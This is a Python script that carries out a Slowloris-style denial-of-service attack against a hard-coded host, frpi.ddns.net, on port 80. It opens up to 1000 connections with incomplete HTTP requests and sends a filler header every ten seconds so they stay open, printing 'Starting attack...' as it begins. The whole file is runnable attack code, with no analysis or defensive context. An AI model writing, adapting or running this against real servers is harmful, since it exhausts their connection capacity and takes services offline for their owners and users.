import socket
import time


def make_connections(active_conn, num_conn):
    """
    Generates list of new socket connections to append to active connections
    :param active_conn: number of active connections
    :param num_conn: number of desired connections
    :return: list of new socket connections
    """
    ip = socket.gethostbyname('frpi.ddns.net')
    port = 80
    conn_list = []

    for i in range(0, num_conn-active_conn):
        sock = socket_init(ip, port)
        if sock is not 0:
            conn_list += [sock]
        else:
            break  # connections are being refused

    return conn_list


def socket_init(ip, port):
    """
    Initializes socket to IP and port given
    :param ip: IP address to connect to
    :param port: Port to connect to
    :return: socket if connection made, 0 otherwise
    """
    try:
        message = "GET / HTTP/1.1\r\nHost: frpi.ddns.net\r\n"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((ip, port))
        sock.send(message.encode())
        return sock
    except:
        return 0


def send_headers(conn_list):
    """
    Send headers with active connections, removes inactive connections
    :param conn_list:
    :return:
    """
    new_conn_list = conn_list
    header = "X-fake_header: Hello\r\n"
    indices = []
    for i in range(0, len(conn_list)):
        try:
            conn_list[i].send(header.encode())
        except:
            if len(conn_list) is not 0:
                indices += [i]
    for index in sorted(indices, reverse=True):
        del new_conn_list[index]
    return new_conn_list


def main():
    num_connections = 1000
    connection_list = []

    print("Starting attack...")

    while True:
        connection_list += make_connections(len(connection_list), num_connections)
        print("Connections open: " + str(len(connection_list)))
        connection_list = send_headers(connection_list)
        print("Headers sent!\n")
        time.sleep(10)


if __name__ == '__main__':
    main()